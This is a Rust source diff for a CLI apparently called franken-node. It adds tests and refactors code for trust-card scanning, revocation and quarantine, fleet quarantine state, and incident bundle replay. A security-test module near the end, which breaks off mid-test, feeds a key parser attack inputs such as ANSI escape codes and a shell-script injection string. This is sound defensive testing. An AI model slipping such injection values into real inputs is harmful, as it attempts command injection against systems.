@@ -7816,6 +7816,31 @@ mod trust_command_tests {
     }
 
     #[test]
+    fn trust_card_positive_flow_renders_selected_card() {
+        let now_secs = 1_700_000_010;
+        let mut registry =
+            supply_chain::trust_card::fixture_registry(now_secs).expect("fixture registry");
+        let card = registry
+            .read("npm:@acme/auth-guard", now_secs, "trace-test-trust-card")
+            .expect("read should succeed")
+            .expect("trust card should exist");
+
+        let rendered = render_trust_card_human(&card);
+
+        assert!(rendered.contains("extension: npm:@acme/auth-guard@"));
+        assert!(rendered.contains("revocation: active"));
+        assert!(rendered.contains("quarantine: false"));
+    }
+
+    #[test]
+    fn trust_card_missing_input_reports_scan_recovery_command() {
+        let err = trust_card_not_found_error("npm:@missing/package").to_string();
+
+        assert!(err.contains("trust card not found: npm:@missing/package"));
+        assert!(err.contains("franken-node trust scan ."));
+    }
+
+    #[test]
     fn trust_list_filters_by_risk_and_revocation_status() {
         let mut registry =
             supply_chain::trust_card::fixture_registry(now_unix_secs()).expect("fixture registry");
@@ -7849,6 +7874,203 @@ mod trust_command_tests {
     }
 
     #[test]
+    fn trust_list_positive_flow_renders_sorted_table_with_statuses() {
+        let now_secs = 1_700_000_011;
+        let mut registry =
+            supply_chain::trust_card::fixture_registry(now_secs).expect("fixture registry");
+        let cards = registry
+            .list(
+                &TrustCardListFilter::empty(),
+                "trace-test-trust-list",
+                now_secs,
+            )
+            .expect("list should succeed");
+
+        let rendered =
+            render_trust_card_list(&filter_trust_cards_for_trust_command(cards, None, None));
+
+        assert!(rendered.starts_with("extension | publisher | cert | reputation | status"));
+        assert!(rendered.contains("npm:@acme/auth-guard"));
+        assert!(rendered.contains("npm:@beta/telemetry-bridge"));
+        assert!(rendered.contains("revoked:"));
+    }
+
+    #[test]
+    fn trust_scan_positive_flow_creates_cards_from_manifest_without_network() {
+        let tmp = tempfile::tempdir().expect("tempdir");
+        std::fs::write(
+            tmp.path().join("package.json"),
+            r#"{"dependencies":{"left-pad":"1.3.0"},"devDependencies":{"@acme/tool":"^2.0.0"}}"#,
+        )
+        .expect("write package manifest");
+
+        let report = run_trust_scan(tmp.path(), false, false).expect("trust scan should succeed");
+
+        assert_eq!(report.command, "trust_scan");
+        assert_eq!(report.scanned_dependencies, 2);
+        assert_eq!(report.created_cards, 2);
+        assert_eq!(report.skipped_existing, 0);
+        assert!(report.warnings.is_empty());
+        assert!(
+            report
+                .items
+                .iter()
+                .any(|item| item.extension_id == "npm:left-pad")
+        );
+        assert!(
+            tmp.path()
+                .join(TRUST_CARD_REGISTRY_STATE_RELATIVE_PATH)
+                .is_file()
+        );
+    }
+
+    #[test]
+    fn trust_scan_rejects_malformed_package_manifest_json() {
+        let tmp = tempfile::tempdir().expect("tempdir");
+        std::fs::write(tmp.path().join("package.json"), "{not-json")
+            .expect("write malformed package manifest");
+
+        let err = run_trust_scan(tmp.path(), false, false).expect_err("scan should reject JSON");
+
+        assert!(err.to_string().contains("invalid dependency manifest JSON"));
+    }
+
+    #[test]
+    fn trust_scan_second_run_skips_existing_cards() {
+        let tmp = tempfile::tempdir().expect("tempdir");
+        std::fs::write(
+            tmp.path().join("package.json"),
+            r#"{"dependencies":{"left-pad":"1.3.0","is-odd":"3.0.1"}}"#,
+        )
+        .expect("write package manifest");
+
+        let first = run_trust_scan(tmp.path(), false, false).expect("first scan should succeed");
+        let second = run_trust_scan(tmp.path(), false, false).expect("second scan should succeed");
+
+        assert_eq!(first.created_cards, 2);
+        assert_eq!(first.skipped_existing, 0);
+        assert_eq!(second.created_cards, 0);
+        assert_eq!(second.skipped_existing, 2);
+        assert!(
+            second
+                .items
+                .iter()
+                .all(|item| item.status == TrustScanItemStatus::SkippedExisting)
+        );
+    }
+
+    #[test]
+    fn trust_sync_revocation_freshness_gate_triggers_at_ttl_boundary() {
+        let now_secs = 1_700_000_120;
+        let mut registry =
+            supply_chain::trust_card::fixture_registry(now_secs).expect("fixture registry");
+        let mut revoked_card = registry
+            .read(
+                "npm:@beta/telemetry-bridge",
+                now_secs,
+                "trace-test-trust-sync",
+            )
+            .expect("read should succeed")
+            .expect("revoked fixture card should exist");
+
+        assert!(matches!(
+            revoked_card.revocation_status,
+            RevocationStatus::Revoked { .. }
+        ));
+        revoked_card.last_verified_timestamp = rfc3339_timestamp_from_secs(now_secs);
+        assert!(!trust_sync_card_needs_network_refresh(
+            &revoked_card,
+            now_secs + 59,
+            60,
+            false
+        ));
+        assert!(trust_sync_card_needs_network_refresh(
+            &revoked_card,
+            now_secs + 60,
+            60,
+            false
+        ));
+    }
+
+    #[test]
+    fn trust_sync_force_refresh_overrides_fresh_cache() {
+        let now_secs = 1_700_000_122;
+        let mut registry =
+            supply_chain::trust_card::fixture_registry(now_secs).expect("fixture registry");
+        let mut card = registry
+            .read("npm:@acme/auth-guard", now_secs, "trace-test-trust-sync")
+            .expect("read should succeed")
+            .expect("fixture card should exist");
+        card.last_verified_timestamp = rfc3339_timestamp_from_secs(now_secs);
+
+        assert!(!trust_sync_card_needs_network_refresh(
+            &card,
+            now_secs + 1,
+            60,
+            false
+        ));
+        assert!(trust_sync_card_needs_network_refresh(
+            &card,
+            now_secs + 1,
+            60,
+            true
+        ));
+    }
+
+    #[test]
+    fn trust_sync_malformed_timestamp_fails_closed_to_refresh() {
+        let now_secs = 1_700_000_123;
+        let mut registry =
+            supply_chain::trust_card::fixture_registry(now_secs).expect("fixture registry");
+        let mut card = registry
+            .read("npm:@acme/auth-guard", now_secs, "trace-test-trust-sync")
+            .expect("read should succeed")
+            .expect("fixture card should exist");
+        card.last_verified_timestamp = "not-a-timestamp".to_string();
+
+        assert!(trust_sync_card_needs_network_refresh(
+            &card, now_secs, 60, false
+        ));
+    }
+
+    #[test]
+    fn trust_sync_summary_counts_revoked_quarantined_and_forced_refreshes() {
+        let now_secs = 1_700_000_121;
+        let mut registry =
+            supply_chain::trust_card::fixture_registry(now_secs).expect("fixture registry");
+        let cards = registry
+            .list(
+                &TrustCardListFilter::empty(),
+                "trace-test-trust-sync",
+                now_secs,
+            )
+            .expect("list should succeed");
+        let sync_report = TrustCardSyncReport {
+            total_cards: cards.len(),
+            cache_hits: 1,
+            cache_misses: 2,
+            stale_refreshes: 3,
+            forced_refreshes: 4,
+        };
+        let audit_report = TrustSyncAuditRefreshReport {
+            refreshed_count: 5,
+            vulnerabilities_found: 6,
+            network_errors: 7,
+            warnings: Vec::new(),
+        };
+
+        let rendered = render_trust_sync_summary(&cards, &sync_report, &audit_report, true);
+
+        assert!(rendered.contains("force=true"));
+        assert!(rendered.contains("refreshed=5"));
+        assert!(rendered.contains("vulnerabilities=6"));
+        assert!(rendered.contains("network_errors=7"));
+        assert!(rendered.contains("forced_refreshes=4"));
+        assert!(rendered.contains("revoked=1"));
+        assert!(rendered.contains("quarantined=1"));
+    }
+
+    #[test]
     fn trust_revoke_uses_logical_now_secs_for_timestamps() {
         let now_secs = 1_700_000_123;
         let mut registry =
@@ -7863,6 +8085,55 @@ mod trust_command_tests {
             &card.revocation_status,
             RevocationStatus::Revoked { revoked_at, .. } if revoked_at == &expected_timestamp
         ));
+        assert!(card.active_quarantine);
+        assert_eq!(card.reputation_trend, ReputationTrend::Declining);
+        assert_eq!(card.user_facing_risk_assessment.level, RiskLevel::Critical);
+    }
+
+    #[test]
+    fn trust_revoke_rejects_unknown_extension_with_actionable_scan_hint() {
+        let now_secs = 1_700_000_124;
+        let mut registry =
+            supply_chain::trust_card::fixture_registry(now_secs).expect("fixture registry");
+
+        let err = revoke_trust_card(&mut registry, "npm:@missing/package", now_secs)
+            .expect_err("revoke should reject unknown extension");
+        let rendered = err.to_string();
+
+        assert!(rendered.contains("trust card not found: npm:@missing/package"));
+        assert!(rendered.contains("franken-node trust scan ."));
+    }
+
+    #[test]
+    fn trust_quarantine_positive_flow_accepts_extension_id_direct_match() {
+        let now_secs = 1_700_000_455;
+        let mut registry =
+            supply_chain::trust_card::fixture_registry(now_secs).expect("fixture registry");
+
+        let updates = quarantine_trust_cards(&mut registry, "npm:@acme/auth-guard", now_secs)
+            .expect("quarantine should succeed");
+
+        assert_eq!(updates.len(), 1);
+        assert_eq!(updates[0].extension.extension_id, "npm:@acme/auth-guard");
+        assert!(updates[0].active_quarantine);
+    }
+
+    #[test]
+    fn trust_quarantine_accepts_uppercase_sha256_prefix() {
+        let now_secs = 1_700_000_456;
+        let mut registry =
+            supply_chain::trust_card::fixture_registry(now_secs).expect("fixture registry");
+
+        let updates = quarantine_trust_cards(&mut registry, " sha256:DEADBEEF ", now_secs)
+            .expect("quarantine should normalize uppercase prefix");
+
+        assert_eq!(updates.len(), 2);
+        assert!(updates.iter().all(|card| {
+            card.provenance_summary
+                .artifact_hashes
+                .iter()
+                .any(|hash| hash.starts_with("sha256:deadbeef"))
+        }));
     }
 
     #[test]
@@ -7896,6 +8167,18 @@ mod trust_command_tests {
             err.to_string()
                 .contains("sha256 prefix must include at least")
         );
+    }
+
+    #[test]
+    fn trust_quarantine_rejects_empty_artifact() {
+        let now_secs = 1_700_000_502;
+        let mut registry =
+            supply_chain::trust_card::fixture_registry(now_secs).expect("fixture registry");
+
+        let err = quarantine_trust_cards(&mut registry, " \t ", now_secs)
+            .expect_err("should reject empty artifact");
+
+        assert!(err.to_string().contains("artifact must not be empty"));
     }
 
     #[test]
@@ -8780,6 +9063,251 @@ mod fleet_command_tests {
             ConvergencePhase::TimedOut
         );
     }
+
+    #[test]
+    fn fleet_zone_filters_match_all_and_exact_zones_only() {
+        assert!(zone_matches_filter("prod", "all"));
+        assert!(zone_matches_filter("all", "prod"));
+        assert!(zone_matches_filter("prod", "prod"));
+        assert!(!zone_matches_filter("prod", "staging"));
+
+        let node = PersistedNodeStatus {
+            zone_id: "prod".to_string(),
+            node_id: "node-1".to_string(),
+            last_seen: DateTime::parse_from_rfc3339("2026-04-06T01:00:00Z")
+                .expect("timestamp")
+                .with_timezone(&Utc),
+            quarantine_version: 1,
+            health: PersistedNodeHealth::Healthy,
+        };
+        assert!(node_matches_filter(&node, "all"));
+        assert!(node_matches_filter(&node, "prod"));
+        assert!(!node_matches_filter(&node, "staging"));
+    }
+
+    #[test]
+    fn fleet_zone_filters_do_not_match_prefixes_or_substrings() {
+        assert!(!zone_matches_filter("prod-west", "prod"));
+        assert!(!zone_matches_filter("prod", "prod-west"));
+        assert!(!zone_matches_filter("us-prod", "prod"));
+
+        let node = PersistedNodeStatus {
+            zone_id: "prod-west".to_string(),
+            node_id: "node-1".to_string(),
+            last_seen: DateTime::parse_from_rfc3339("2026-04-06T01:00:00Z")
+                .expect("timestamp")
+                .with_timezone(&Utc),
+            quarantine_version: 1,
+            health: PersistedNodeHealth::Healthy,
+        };
+        assert!(!node_matches_filter(&node, "prod"));
+        assert!(!node_matches_filter(&node, "west"));
+    }
+
+    #[test]
+    fn fleet_next_quarantine_version_is_zone_scoped() {
+        let state = FleetSharedState {
+            schema_version: control_plane::fleet_transport::FLEET_SHARED_STATE_SCHEMA.to_string(),
+            actions: vec![
+                PersistedFleetActionRecord {
+                    action_id: "fleet-op-prod-1".to_string(),
+                    emitted_at: DateTime::parse_from_rfc3339("2026-04-06T01:00:00Z")
+                        .expect("timestamp")
+                        .with_timezone(&Utc),
+                    action: PersistedFleetAction::Quarantine {
+                        zone_id: "prod".to_string(),
+                        incident_id: "inc-prod-1".to_string(),
+                        target_id: "sha256:prod-1".to_string(),
+                        target_kind: PersistedFleetTargetKind::Artifact,
+                        reason: "prod".to_string(),
+                        quarantine_version: 4,
+                    },
+                },
+                PersistedFleetActionRecord {
+                    action_id: "fleet-op-stage-1".to_string(),
+                    emitted_at: DateTime::parse_from_rfc3339("2026-04-06T01:01:00Z")
+                        .expect("timestamp")
+                        .with_timezone(&Utc),
+                    action: PersistedFleetAction::Quarantine {
+                        zone_id: "staging".to_string(),
+                        incident_id: "inc-stage-1".to_string(),
+                        target_id: "sha256:stage-1".to_string(),
+                        target_kind: PersistedFleetTargetKind::Artifact,
+                        reason: "staging".to_string(),
+                        quarantine_version: 9,
+                    },
+                },
+            ],
+            nodes: Vec::new(),
+        };
+
+        assert_eq!(next_quarantine_version(&state, "prod"), 5);
+        assert_eq!(next_quarantine_version(&state, "staging"), 10);
+        assert_eq!(next_quarantine_version(&state, "dev"), 1);
+    }
+
+    #[test]
+    fn fleet_aggregate_convergence_prefers_timed_out_incidents() {
+        let emitted_at = DateTime::parse_from_rfc3339("2026-04-06T01:00:00Z")
+            .expect("timestamp")
+            .with_timezone(&Utc);
+        let incidents = vec![
+            FleetCliPendingIncident {
+                incident_id: "inc-propagating".to_string(),
+                zone_id: "prod".to_string(),
+                target_id: "sha256:p".to_string(),
+                target_kind: PersistedFleetTargetKind::Artifact,
+                reason: "propagating".to_string(),
+                quarantine_version: 3,
+                emitted_at,
+                convergence: ConvergenceState {
+                    converged_nodes: 1,
+                    total_nodes: 3,
+                    progress_pct: 33,
+                    eta_seconds: Some(2),
+                    phase: ConvergencePhase::Propagating,
+                },
+            },
+            FleetCliPendingIncident {
+                incident_id: "inc-timeout".to_string(),
+                zone_id: "prod".to_string(),
+                target_id: "sha256:t".to_string(),
+                target_kind: PersistedFleetTargetKind::Artifact,
+                reason: "timeout".to_string(),
+                quarantine_version: 4,
+                emitted_at,
+                convergence: ConvergenceState {
+                    converged_nodes: 1,
+                    total_nodes: 2,
+                    progress_pct: 50,
+                    eta_seconds: None,
+                    phase: ConvergencePhase::TimedOut,
+                },
+            },
+        ];
+
+        let aggregate = aggregate_convergence(&incidents).expect("aggregate");
+
+        assert_eq!(aggregate.converged_nodes, 2);
+        assert_eq!(aggregate.total_nodes, 5);
+        assert_eq!(aggregate.progress_pct, 40);
+        assert_eq!(aggregate.phase, ConvergencePhase::TimedOut);
+        assert_eq!(aggregate.eta_seconds, None);
+    }
+
+    #[test]
+    fn derive_active_fleet_incidents_ignores_release_for_different_incident() {
+        let state = FleetSharedState {
+            schema_version: control_plane::fleet_transport::FLEET_SHARED_STATE_SCHEMA.to_string(),
+            actions: vec![
+                PersistedFleetActionRecord {
+                    action_id: "fleet-op-q-active".to_string(),
+                    emitted_at: DateTime::parse_from_rfc3339("2026-04-06T01:00:00Z")
+                        .expect("timestamp")
+                        .with_timezone(&Utc),
+                    action: PersistedFleetAction::Quarantine {
+                        zone_id: "prod".to_string(),
+                        incident_id: "inc-active".to_string(),
+                        target_id: "sha256:active".to_string(),
+                        target_kind: PersistedFleetTargetKind::Artifact,
+                        reason: "active quarantine".to_string(),
+                        quarantine_version: 3,
+                    },
+                },
+                PersistedFleetActionRecord {
+                    action_id: "fleet-op-release-other".to_string(),
+                    emitted_at: DateTime::parse_from_rfc3339("2026-04-06T01:01:00Z")
+                        .expect("timestamp")
+                        .with_timezone(&Utc),
+                    action: PersistedFleetAction::Release {
+                        zone_id: "prod".to_string(),
+                        incident_id: "inc-other".to_string(),
+                        reason: Some("operator typo".to_string()),
+                    },
+                },
+            ],
+            nodes: vec![PersistedNodeStatus {
+                zone_id: "prod".to_string(),
+                node_id: "node-1".to_string(),
+                last_seen: DateTime::parse_from_rfc3339("2026-04-06T01:02:00Z")
+                    .expect("timestamp")
+                    .with_timezone(&Utc),
+                quarantine_version: 3,
+                health: PersistedNodeHealth::Healthy,
+            }],
+        };
+
+        let incidents = derive_active_fleet_incidents(&state, &[]);
+
+        assert_eq!(incidents.len(), 1);
+        assert_eq!(incidents[0].incident_id, "inc-active");
+        assert_eq!(incidents[0].target_id, "sha256:active");
+    }
+
+    #[test]
+    fn derive_active_fleet_incidents_keeps_requarantine_after_release() {
+        let state = FleetSharedState {
+            schema_version: control_plane::fleet_transport::FLEET_SHARED_STATE_SCHEMA.to_string(),
+            actions: vec![
+                PersistedFleetActionRecord {
+                    action_id: "fleet-op-q1".to_string(),
+                    emitted_at: DateTime::parse_from_rfc3339("2026-04-06T01:00:00Z")
+                        .expect("timestamp")
+                        .with_timezone(&Utc),
+                    action: PersistedFleetAction::Quarantine {
+                        zone_id: "prod".to_string(),
+                        incident_id: "inc-repeat".to_string(),
+                        target_id: "sha256:old".to_string(),
+                        target_kind: PersistedFleetTargetKind::Artifact,
+                        reason: "first quarantine".to_string(),
+                        quarantine_version: 1,
+                    },
+                },
+                PersistedFleetActionRecord {
+                    action_id: "fleet-op-release".to_string(),
+                    emitted_at: DateTime::parse_from_rfc3339("2026-04-06T01:01:00Z")
+                        .expect("timestamp")
+                        .with_timezone(&Utc),
+                    action: PersistedFleetAction::Release {
+                        zone_id: "prod".to_string(),
+                        incident_id: "inc-repeat".to_string(),
+                        reason: Some("cleared".to_string()),
+                    },
+                },
+                PersistedFleetActionRecord {
+                    action_id: "fleet-op-q2".to_string(),
+                    emitted_at: DateTime::parse_from_rfc3339("2026-04-06T01:02:00Z")
+                        .expect("timestamp")
+                        .with_timezone(&Utc),
+                    action: PersistedFleetAction::Quarantine {
+                        zone_id: "prod".to_string(),
+                        incident_id: "inc-repeat".to_string(),
+                        target_id: "sha256:new".to_string(),
+                        target_kind: PersistedFleetTargetKind::Artifact,
+                        reason: "repeat quarantine".to_string(),
+                        quarantine_version: 2,
+                    },
+                },
+            ],
+            nodes: vec![PersistedNodeStatus {
+                zone_id: "prod".to_string(),
+                node_id: "node-1".to_string(),
+                last_seen: DateTime::parse_from_rfc3339("2026-04-06T01:03:00Z")
+                    .expect("timestamp")
+                    .with_timezone(&Utc),
+                quarantine_version: 2,
+                health: PersistedNodeHealth::Healthy,
+            }],
+        };
+
+        let incidents = derive_active_fleet_incidents(&state, &[]);
+
+        assert_eq!(incidents.len(), 1);
+        assert_eq!(incidents[0].incident_id, "inc-repeat");
+        assert_eq!(incidents[0].target_id, "sha256:new");
+        assert_eq!(incidents[0].quarantine_version, 2);
+        assert_eq!(incidents[0].convergence.phase, ConvergencePhase::Converged);
+    }
 }
 
 #[cfg(test)]
@@ -8824,6 +9352,23 @@ mod incident_list_tests {
         }
         let bundle = generate_replay_bundle(incident_id, &events).expect("bundle");
         write_bundle_to_path(&bundle, path).expect("write bundle");
+    }
+
+    fn corrupt_bundle_integrity_hash(path: &Path) {
+        let contents = std::fs::read_to_string(path).expect("read bundle");
+        let marker = "\"integrity_hash\":\"";
+        let start = contents
+            .find(marker)
+            .map(|idx| idx + marker.len())
+            .expect("integrity hash marker");
+
+        let mut bytes = contents.into_bytes();
+        bytes[start] = match bytes[start] {
+            b'0' => b'1',
+            b'1' => b'0',
+            _ => b'0',
+        };
+        std::fs::write(path, bytes).expect("write corrupted bundle");
     }
 
     fn write_fixture_incident_evidence_package(workspace: &Path, incident_id: &str) -> PathBuf {
@@ -9063,6 +9608,125 @@ mod incident_list_tests {
             "{err:#}"
         );
         assert!(!output_path.exists());
+    }
+
+    #[test]
+    fn incident_bundle_command_uses_slugged_output_for_punctuation_id() {
+        let _lock = cwd_test_lock()
+            .lock()
+            .unwrap_or_else(std::sync::PoisonError::into_inner);
+        let dir = tempfile::tempdir().expect("tempdir");
+        let previous_cwd = std::env::current_dir().expect("cwd");
+        let incident_id = "INC/FRESH:001";
+        std::fs::write(
+            dir.path().join("franken_node.toml"),
+            "profile = \"balanced\"\n",
+        )
+        .expect("write config");
+        let evidence_path = write_fixture_incident_evidence_package(dir.path(), incident_id);
+        std::env::set_current_dir(dir.path()).expect("set cwd");
+
+        let run_result = handle_incident_bundle_command(&cli::IncidentBundleArgs {
+            id: incident_id.to_string(),
+            evidence_path: Some(evidence_path),
+            verify: true,
+            receipt_signing_key: None,
+            receipt_out: None,
+            receipt_summary_out: None,
+        });
+        let output_path = dir.path().join("INC_FRESH_001.fnbundle");
+        let restore_result = std::env::set_current_dir(&previous_cwd);
+
+        run_result.expect("bundle command should succeed");
+        restore_result.expect("restore cwd");
+
+        assert!(output_path.is_file());
+        assert_eq!(
+            read_bundle_from_path(&output_path)
+                .expect("read bundle")
+                .incident_id,
+            incident_id
+        );
+    }
+
+    #[test]
+    fn incident_replay_summary_accepts_matching_bundle() {
+        let temp = tempfile::tempdir().expect("tempdir");
+        let bundle_path = temp.path().join("INC-REPLAY-001.fnbundle");
+        write_fixture_bundle(&bundle_path, "INC-REPLAY-001", "high");
+
+        let summary = incident_replay_cli_summary(&bundle_path).expect("replay summary");
+
+        assert_eq!(summary.incident_id, "INC-REPLAY-001");
+        assert!(summary.matched);
+        assert_eq!(summary.event_count, 3);
+        assert_eq!(
+            summary.expected_sequence_hash,
+            summary.replayed_sequence_hash
+        );
+    }
+
+    #[test]
+    fn incident_replay_summary_rejects_missing_bundle() {
+        let temp = tempfile::tempdir().expect("tempdir");
+        let missing = temp.path().join("missing.fnbundle");
+
+        let err = incident_replay_cli_summary(&missing).expect_err("missing bundle must fail");
+
+        assert!(
+            format!("{err:#}").contains("failed reading replay bundle"),
+            "{err:#}"
+        );
+    }
+
+    #[test]
+    fn incident_replay_summary_fails_closed_on_corrupted_bundle() {
+        let temp = tempfile::tempdir().expect("tempdir");
+        let bundle_path = temp.path().join("INC-REPLAY-CORRUPT.fnbundle");
+        write_fixture_bundle(&bundle_path, "INC-REPLAY-CORRUPT", "high");
+        corrupt_bundle_integrity_hash(&bundle_path);
+
+        let err = incident_replay_cli_summary(&bundle_path).expect_err("corrupt bundle must fail");
+
+        assert!(
+            format!("{err:#}").contains("bundle integrity mismatch"),
+            "{err:#}"
+        );
+    }
+
+    #[test]
+    fn incident_counterfactual_summary_reports_strict_policy_changes() {
+        let temp = tempfile::tempdir().expect("tempdir");
+        let bundle_path = temp.path().join("INC-CF-001.fnbundle");
+        write_fixture_bundle(&bundle_path, "INC-CF-001", "high");
+
+        let summary =
+            incident_counterfactual_cli_summary(&bundle_path, "strict").expect("counterfactual");
+        let canonical: serde_json::Value =
+            serde_json::from_str(&summary.canonical_json).expect("counterfactual json");
+
+        assert_eq!(summary.total_decisions, 3);
+        assert!(summary.changed_decisions > 0);
+        assert_eq!(canonical["mode"], "single");
+        assert_eq!(
+            canonical["summary_statistics"]["changed_decisions"],
+            serde_json::json!(summary.changed_decisions)
+        );
+    }
+
+    #[test]
+    fn incident_counterfactual_summary_rejects_invalid_policy() {
+        let temp = tempfile::tempdir().expect("tempdir");
+        let bundle_path = temp.path().join("INC-CF-BAD-POLICY.fnbundle");
+        write_fixture_bundle(&bundle_path, "INC-CF-BAD-POLICY", "high");
+
+        let err = incident_counterfactual_cli_summary(&bundle_path, "not-a-policy")
+            .expect_err("invalid policy must fail");
+
+        assert!(
+            format!("{err:#}").contains("invalid policy override spec `not-a-policy`"),
+            "{err:#}"
+        );
     }
 }
 
@@ -10483,6 +11147,106 @@ fn handle_incident_bundle_command(args: &cli::IncidentBundleArgs) -> Result<()> 
         evidence_path.display()
     );
 
+    Ok(())
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct IncidentReplayCliSummary {
+    incident_id: String,
+    matched: bool,
+    event_count: usize,
+    expected_sequence_hash: String,
+    replayed_sequence_hash: String,
+}
+
+fn incident_replay_cli_summary(bundle_path: &Path) -> Result<IncidentReplayCliSummary> {
+    let bundle = read_bundle_from_path(bundle_path)
+        .with_context(|| format!("failed reading replay bundle {}", bundle_path.display()))?;
+    let outcome = replay_incident_bundle(&bundle)
+        .with_context(|| format!("failed replaying bundle {}", bundle_path.display()))?;
+
+    Ok(IncidentReplayCliSummary {
+        incident_id: outcome.incident_id,
+        matched: outcome.matched,
+        event_count: outcome.event_count,
+        expected_sequence_hash: outcome.expected_sequence_hash,
+        replayed_sequence_hash: outcome.replayed_sequence_hash,
+    })
+}
+
+fn handle_incident_replay_command(args: &cli::IncidentReplayArgs) -> Result<()> {
+    eprintln!(
+        "franken-node incident replay: bundle={}",
+        args.bundle.display()
+    );
+    let summary = incident_replay_cli_summary(&args.bundle)?;
+    eprintln!(
+        "incident replay result: matched={} event_count={} expected={} replayed={}",
+        summary.matched,
+        summary.event_count,
+        summary.expected_sequence_hash,
+        summary.replayed_sequence_hash
+    );
+    if !summary.matched {
+        anyhow::bail!(
+            "replay mismatch for incident {} in bundle {}",
+            summary.incident_id,
+            args.bundle.display()
+        );
+    }
+    Ok(())
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct IncidentCounterfactualCliSummary {
+    total_decisions: usize,
+    changed_decisions: usize,
+    severity_delta: i64,
+    canonical_json: String,
+}
+
+fn incident_counterfactual_cli_summary(
+    bundle_path: &Path,
+    policy: &str,
+) -> Result<IncidentCounterfactualCliSummary> {
+    let bundle = read_bundle_from_path(bundle_path)
+        .with_context(|| format!("failed reading replay bundle {}", bundle_path.display()))?;
+    let baseline_policy = PolicyConfig::from_bundle(&bundle);
+    let mode = PolicyConfig::from_cli_spec(policy, &baseline_policy)
+        .with_context(|| format!("invalid policy override spec `{policy}`"))?;
+    let engine = CounterfactualReplayEngine::default();
+    let output = engine
+        .simulate(&bundle, &baseline_policy, mode)
+        .with_context(|| {
+            format!(
+                "counterfactual replay failed for bundle {}",
+                bundle_path.display()
+            )
+        })?;
+    let (total_decisions, changed_decisions, severity_delta) = summarize_output(&output);
+    let canonical_json = counterfactual_to_json(&output)
+        .context("failed encoding counterfactual output to canonical json")?;
+
+    Ok(IncidentCounterfactualCliSummary {
+        total_decisions,
+        changed_decisions,
+        severity_delta,
+        canonical_json,
+    })
+}
+
+fn handle_incident_counterfactual_command(args: &cli::IncidentCounterfactualArgs) -> Result<()> {
+    eprintln!(
+        "franken-node incident counterfactual: bundle={} policy={}",
+        args.bundle.display(),
+        args.policy
+    );
+    let summary = incident_counterfactual_cli_summary(&args.bundle, &args.policy)?;
+    eprintln!(
+        "counterfactual summary: total_decisions={} changed_decisions={} severity_delta={}",
+        summary.total_decisions, summary.changed_decisions, summary.severity_delta
+    );
+    eprintln!("counterfactual output: {}", summary.canonical_json);
     Ok(())
 }
 
@@ -12452,7 +13216,7 @@ fn trust_sync_card_needs_network_refresh(
     chrono::DateTime::parse_from_rfc3339(&card.last_verified_timestamp)
         .ok()
         .and_then(|timestamp| u64::try_from(timestamp.timestamp()).ok())
-        .map(|verified_secs| now_secs.saturating_sub(verified_secs) > cache_ttl_secs)
+        .map(|verified_secs| now_secs.saturating_sub(verified_secs) >= cache_ttl_secs)
         .unwrap_or(true)
 }
 
@@ -17090,61 +17854,10 @@ fn main() -> Result<()> {
                 handle_incident_bundle_command(&args)?;
             }
             IncidentCommand::Replay(args) => {
-                eprintln!(
-                    "franken-node incident replay: bundle={}",
-                    args.bundle.display()
-                );
-                let bundle = read_bundle_from_path(&args.bundle).with_context(|| {
-                    format!("failed reading replay bundle {}", args.bundle.display())
-                })?;
-                let outcome = replay_incident_bundle(&bundle).with_context(|| {
-                    format!("failed replaying bundle {}", args.bundle.display())
-                })?;
-                eprintln!(
-                    "incident replay result: matched={} event_count={} expected={} replayed={}",
-                    outcome.matched,
-                    outcome.event_count,
-                    outcome.expected_sequence_hash,
-                    outcome.replayed_sequence_hash
-                );
-                if !outcome.matched {
-                    anyhow::bail!(
-                        "replay mismatch for incident {} in bundle {}",
-                        outcome.incident_id,
-                        args.bundle.display()
-                    );
-                }
+                handle_incident_replay_command(&args)?;
             }
             IncidentCommand::Counterfactual(args) => {
-                eprintln!(
-                    "franken-node incident counterfactual: bundle={} policy={}",
-                    args.bundle.display(),
-                    args.policy
-                );
-                let bundle = read_bundle_from_path(&args.bundle).with_context(|| {
-                    format!("failed reading replay bundle {}", args.bundle.display())
-                })?;
-                let baseline_policy = PolicyConfig::from_bundle(&bundle);
-                let mode = PolicyConfig::from_cli_spec(&args.policy, &baseline_policy)
-                    .with_context(|| format!("invalid policy override spec `{}`", args.policy))?;
-                let engine = CounterfactualReplayEngine::default();
-                let output = engine
-                    .simulate(&bundle, &baseline_policy, mode)
-                    .with_context(|| {
-                        format!(
-                            "counterfactual replay failed for bundle {}",
-                            args.bundle.display()
-                        )
-                    })?;
-                let (total_decisions, changed_decisions, severity_delta) =
-                    summarize_output(&output);
-                eprintln!(
-                    "counterfactual summary: total_decisions={} changed_decisions={} severity_delta={}",
-                    total_decisions, changed_decisions, severity_delta
-                );
-                let canonical = counterfactual_to_json(&output)
-                    .context("failed encoding counterfactual output to canonical json")?;
-                eprintln!("counterfactual output: {canonical}");
+                handle_incident_counterfactual_command(&args)?;
             }
             IncidentCommand::List(args) => {
                 let severity_filter = parse_incident_severity_filter(args.severity.as_deref())?;
@@ -17883,5 +18596,970 @@ mod run_trust_gate_tests {
                 .summary
                 .contains("Automatically quarantined")
         );
+    }
+
+    #[cfg(test)]
+    mod main_binary_comprehensive_security_and_attack_vector_tests {
+        use super::*;
+        use std::collections::{HashMap, HashSet};
+
+        #[test]
+        fn test_signing_key_parsing_injection_and_format_attacks() {
+            // Attack 1: Binary injection attempts in signing key data
+            let binary_injection_attacks = vec![
+                vec![0x00; 32],                    // All null bytes
+                vec![0xFF; 32],                    // All ones
+                vec![0xDE, 0xAD, 0xBE, 0xEF].repeat(8), // Repeated patterns
+                (0..32).collect::<Vec<u8>>(),      // Sequential bytes
+                vec![0x80; 32],                    // High bit set
+                vec![0x7F; 32],                    // ASCII DEL
+                b"\x1b[31mINJECTION\x1b[0m".to_vec().into_iter().cycle().take(32).collect(), // ANSI escape codes
+                b"#!/bin/sh\necho pwned".to_vec().into_iter().cycle().take(32).collect(), // Shell injection
+            ];
+
+            for (i, attack_bytes) in binary_injection_attacks.iter().enumerate() {
+                let parse_result = parse_signing_key_from_blob(attack_bytes);
+
+                match parse_result {
+                    Some(signing_key) => {
+                        // If parsing succeeded, verify key is valid
+                        let verifying_key = signing_key.verifying_key();
+                        assert_eq!(verifying_key.as_bytes().len(), 32,
+                                 "Parsed key {} should have 32-byte verifying key", i);
+
+                        // Verify no injection occurred by checking key derivation
+                        let expected_key = ed25519_dalek::SigningKey::from_bytes(attack_bytes);
